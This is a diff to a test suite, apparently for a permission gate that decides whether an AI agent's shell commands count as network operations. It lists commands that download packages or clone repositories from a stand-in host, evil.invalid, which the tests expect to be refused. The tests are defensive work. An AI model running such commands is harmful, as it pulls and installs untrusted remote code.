@@ -35,6 +35,19 @@ describe('an address in a command is a network operation whatever class it got',
     'npm install https://evil.invalid/x.tgz',
     'pip install https://evil.invalid/x.tar.gz',
     'cargo install --git https://evil.invalid/x',
+    'git fetch ssh://evil.invalid/r.git',
+    'git clone ssh://user@evil.invalid/r.git',
+    'git ls-remote git://evil.invalid/r.git',
+    'git clone evil.invalid:r.git',
+    'git clone user@evil.invalid:r.git',
+    'git clone server:r.git',
+    'git -C . clone myhost:r.git',
+    'git -c protocol.version=2 fetch myhost:r.git',
+    'git --no-pager fetch myhost:r.git',
+    'git --git-dir .git --work-tree . pull myhost:r.git',
+    'git -C. -cprotocol.version=2 push myhost:r.git',
+    'sftp myhost:r.git',
+    'rclone copy remote:bucket .',
   ];
 
   it.each(COMMANDS)('refuses %s when the scope has no network', async (command) => {
@@ -67,6 +80,33 @@ describe('an address in a command is a network operation whatever class it got',
     const f = gateFixture({ scope: { tools: ['Bash'] } });
     const verdict = await verdictOf(f, classified('Bash', { command: 'git status && ls' }));
     expect(verdict.decision.effect).toBe('allow');
+  });
+  it.each(['srt', 'hook-only'] as const)(
+    'keeps ordinary module and test references usable in %s mode',
+    async (mode) => {
+      const f = gateFixture({ scope: { tools: ['Bash'] }, body: { mode } });
+      for (const command of [
+        'pytest test_a.py::test_x',
+        'npm test -- foo.test.ts:12',
+        'uvicorn app.main:app',
+        'python -m pkg.mod:main',
+        'echo "git clone"; uvicorn app.main:app',
+      ]) {
+        const verdict = await verdictOf(f, classified('Bash', { command }));
+        expect(verdict.decision.effect, command).toBe('allow');
+      }
+    },
+  );
+  it('does not mistake Node builtins for scp remotes', async () => {
+    const f = gateFixture({ scope: { tools: ['Bash'] } });
+    expect(
+      (
+        await verdictOf(
+          f,
+          classified('Bash', { command: "node -e \"require('node:fs').statSync('.')\"" }),
+        )
+      ).decision.effect,
+    ).toBe('allow');
   });
 
   it.each([
@@ -181,15 +221,15 @@ describe('an escalation lifts what it names and no more', () => {
 
   it('names the first operation that has no escalation, not the first one needed', async () => {
     const f = gateFixture();
-    const a = `${PROJECT}/docs/a.md`;
-    const b = `${PROJECT}/docs/b.md`;
+    const a = '/outside/a.md';
+    const b = '/outside/b.md';
     const call = callOf(
-      'Write',
+      'Read',
       {},
       {
         resources: resourcesOf([
-          ['write', a],
-          ['write', b],
+          ['read', a],
+          ['read', b],
         ]),
         decision: ALLOW,
       },
